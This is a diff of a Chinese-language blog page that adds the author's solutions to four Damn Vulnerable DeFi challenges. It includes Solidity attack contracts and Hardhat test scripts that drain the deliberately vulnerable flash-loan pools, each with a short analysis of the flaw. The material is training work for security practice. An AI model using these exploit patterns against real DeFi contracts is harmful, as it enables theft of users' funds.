@@ -17,13 +17,15 @@
   
     <meta name="keywords" content="" />
   
-  <meta property="og:type" content="article">
+  <meta name="description" content="# damn -vulnearable-defi # unstoppable  题解  1234it(&amp;#x27;Exploit&amp;#x27;, async function () &amp;#123;        &#x2F;** CODE YOUR EXPLOIT HERE *&#x2F;        await this.token.transfer(this.pool.address, 1);    &amp;#125;)">
+<meta property="og:type" content="article">
 <meta property="og:title" content="DVDEFIdo">
 <meta property="og:url" content="http://ctianming.github.io/2023/05/28/DVDEFIdo/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="# damn -vulnearable-defi # unstoppable  题解  1234it(&amp;#x27;Exploit&amp;#x27;, async function () &amp;#123;        &#x2F;** CODE YOUR EXPLOIT HERE *&#x2F;        await this.token.transfer(this.pool.address, 1);    &amp;#125;)">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2023-05-28T13:51:17.000Z">
-<meta property="article:modified_time" content="2023-05-28T13:51:17.626Z">
+<meta property="article:modified_time" content="2023-11-17T11:32:10.610Z">
 <meta property="article:author" content="ClearSky">
 <meta name="twitter:card" content="summary">
   
@@ -136,7 +138,7 @@
                         <i class="fa fa-edit"></i> 
                         
                         
-                            0
+                            ~3.92K
                         
                         字
                     </li>
@@ -148,13 +150,60 @@
             
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                 <div class="icon"><i class="fa fa-warning"></i></div>
-                <div class="text"><p>本文最后编辑于 <time datetime="1685281877626"></time> 前，其中的内容可能需要更新。</p></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1700220730610"></time> 前，其中的内容可能需要更新。</p></div>
             </div>
             
             
             
             <hr />
-            <div itemprop="articleBody"></div>
+            <div itemprop="articleBody"><h1 id="damn-vulnearable-defi"><a class="markdownIt-Anchor" href="#damn-vulnearable-defi">#</a> damn -vulnearable-defi</h1>
+<h2 id="unstoppable"><a class="markdownIt-Anchor" href="#unstoppable">#</a> unstoppable</h2>
+<blockquote>
+<p>题解</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Exploit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">/** CODE YOUR EXPLOIT HERE */</span></span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">token</span>.<span class="title function_">transfer</span>(<span class="variable language_">this</span>.<span class="property">pool</span>.<span class="property">address</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>分析</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">falshLoan() 中存在assert(poolBalance == balanceBefore);</span><br><span class="line">那么只需要不通过deposit()而向pool转账从而使assert不满足条件即可。</span><br></pre></td></tr></table></figure>
+<h2 id="truster"><a class="markdownIt-Anchor" href="#truster">#</a> truster</h2>
+<blockquote>
+<p>题解<br>
+攻击合约：</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./TrusterLenderPool.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface Token &#123;</span><br><span class="line">    function approve(address spender, uint256 amount) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TrusterExploit &#123;</span><br><span class="line">    function getApprove(</span><br><span class="line">        address spender,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) public returns (bytes memory) &#123;</span><br><span class="line">        bytes memory data = abi.encodeWithSelector(</span><br><span class="line">            Token.approve.selector,</span><br><span class="line">            spender,</span><br><span class="line">            amount</span><br><span class="line">        );</span><br><span class="line">        return data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function DOflashLoan(</span><br><span class="line">        TrusterLenderPool pool,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        address borrower,</span><br><span class="line">        address target,</span><br><span class="line">        address player</span><br><span class="line">    ) public &#123;</span><br><span class="line">        bytes memory data = getApprove(player, amount);</span><br><span class="line">        pool.flashLoan(0, borrower, target, data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后在 js 执行另外的操作：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Execution&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">/** CODE YOUR SOLUTION HERE */</span></span><br><span class="line">        <span class="comment">/*const data = web3.eth.abi.encodeFunctionCall(</span></span><br><span class="line"><span class="comment">            &#123;</span></span><br><span class="line"><span class="comment">                name: &#x27;approve&#x27;,</span></span><br><span class="line"><span class="comment">                type: &#x27;function&#x27;,</span></span><br><span class="line"><span class="comment">                inputs: [</span></span><br><span class="line"><span class="comment">                    &#123;</span></span><br><span class="line"><span class="comment">                        type: &#x27;address&#x27;,</span></span><br><span class="line"><span class="comment">                        name: &#x27;spender&#x27;</span></span><br><span class="line"><span class="comment">                    &#125;,</span></span><br><span class="line"><span class="comment">                    &#123;</span></span><br><span class="line"><span class="comment">                        type: &#x27;uint256&#x27;,</span></span><br><span class="line"><span class="comment">                        name: &#x27;amount&#x27;</span></span><br><span class="line"><span class="comment">                    &#125;</span></span><br><span class="line"><span class="comment">                ]</span></span><br><span class="line"><span class="comment">            &#125;, [player.address, TOKENS_IN_POOL]</span></span><br><span class="line"><span class="comment">        )*/</span></span><br><span class="line">        [deployer, player] = <span class="keyword">await</span> ethers.<span class="title function_">getSigners</span>();</span><br><span class="line">        exploit = <span class="keyword">await</span> (<span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&#x27;TrusterExploit&#x27;</span>, deployer)).<span class="title function_">deploy</span>();</span><br><span class="line">        <span class="keyword">await</span> exploit.<span class="title class_">DOflashLoan</span>(pool.<span class="property">address</span>, <span class="variable constant_">TOKENS_IN_POOL</span>, player.<span class="property">address</span>, token.<span class="property">address</span>, player.<span class="property">address</span>);</span><br><span class="line">        <span class="keyword">await</span> token.<span class="title function_">connect</span>(player).<span class="title function_">transferFrom</span>(pool.<span class="property">address</span>, player.<span class="property">address</span>, <span class="variable constant_">TOKENS_IN_POOL</span>);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>分析</p>
+</blockquote>
+<p>构造 data 调用 token 合约的 approve () 函数为自己添加等于 TOKEN_IN_POOL 的许可，然后执行 flashLoan 借走 0 块钱，最后再执行 token 合约的 transferFrom 合约转走钱即可</p>
+<h2 id="naive-receiver"><a class="markdownIt-Anchor" href="#naive-receiver">#</a> naive-receiver</h2>
+<blockquote>
+<p>题解</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Execution&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">/** CODE YOUR SOLUTION HERE */</span></span><br><span class="line">        <span class="keyword">const</span> <span class="variable constant_">ETH</span> = <span class="keyword">await</span> pool.<span class="title function_">ETH</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">await</span> pool.<span class="title function_">flashLoan</span>(receiver.<span class="property">address</span>, <span class="variable constant_">ETH</span>, <span class="number">0</span>, <span class="string">&quot;0x&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>分析<br>
+因为每进行一次借贷都会消耗 1ETH，所以让 receiver 进行十次借贷就行了</p>
+</blockquote>
+<h2 id="side-entrance"><a class="markdownIt-Anchor" href="#side-entrance">#</a> side-entrance</h2>
+<blockquote>
+<p>题解</p>
+</blockquote>
+<blockquote>
+<p>攻击合约</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./SideEntranceLenderPool.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract FlashLoanEtherReceiverMock &#123;</span><br><span class="line">    SideEntranceLenderPool pool;</span><br><span class="line"></span><br><span class="line">    constructor(address ipool) public &#123;</span><br><span class="line">        pool = SideEntranceLenderPool(ipool);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exploit() external payable &#123;</span><br><span class="line">        pool.flashLoan(address(pool).balance);</span><br><span class="line">        pool.withdraw();</span><br><span class="line">        payable(msg.sender).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute() external payable &#123;</span><br><span class="line">        pool.deposit&#123;value: address(this).balance&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>执行操作</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Execution&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">/** CODE YOUR SOLUTION HERE */</span></span><br><span class="line">        <span class="keyword">let</span> attacker = <span class="keyword">await</span> (<span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&#x27;FlashLoanEtherReceiverMock&#x27;</span>, player)).<span class="title function_">deploy</span>(pool.<span class="property">address</span>);</span><br><span class="line">        <span class="keyword">await</span> attacker.<span class="title function_">connect</span>(player).<span class="title function_">exploit</span>();</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>分析：</p>
+</blockquote>
+<p>执行 falsnLoan () 后执行 excute ()，将借出来的钱存入 pool 中自己的账户，但因为确实 pool 中有那么多钱，所以绕过了 <strong>if (address(this).balance &lt; balanceBefore) revert RepayFailed();</strong> 的检查。之后就可以调用 withdraw () 进行取款并将钱转给自己。</p>
+</div>
         </div>
         
             <div class="kratos-copyright text-center clearfix">
@@ -221,7 +270,12 @@
             const twitterBase   = "https://twitter.com/intent/tweet?";
             const hostUrl       = "http://ctianming.github.io/2023/05/28/DVDEFIdo/";
             const title         = "「DVDEFIdo」";
-            const excerpt       = ``;
+            const excerpt       = `# damn -vulnearable-defi
+# unstoppable
+
+题解
+
+1234it(&#x27;Exploit&#x27;, async function () &#123;        /** CODE YOUR...`;
             let _URL;
             switch (dest) {
                 case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
@@ -243,7 +297,7 @@
                     
                 </div>
                 <div class="pull-date">
-                    <time datetime="2023-05-28T13:51:17.626Z" itemprop="dateModified">最后编辑：2023-05-28</time>
+                    <time datetime="2023-11-17T11:32:10.610Z" itemprop="dateModified">最后编辑：2023-11-17</time>
                 </div>
             </div>
         </footer>
